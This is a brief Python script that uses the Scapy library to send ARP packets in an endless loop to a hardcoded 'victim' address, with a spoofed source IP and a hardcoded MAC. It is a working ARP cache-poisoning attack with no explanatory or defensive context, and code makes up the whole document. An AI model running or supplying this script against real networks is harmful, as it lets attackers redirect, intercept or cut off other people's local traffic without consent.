#! /usr/bin/python

from scapy.all import *
import time

op=1
victim='192.168.1.11'
spoof='192.168.0.19'
mac='e4:ce:8f:2e:3e:de'

arp=ARP(op=op, psrc=spoof, pdst=victim, hwdst=mac)

while True:
    send(arp)
    time.sleep(2)
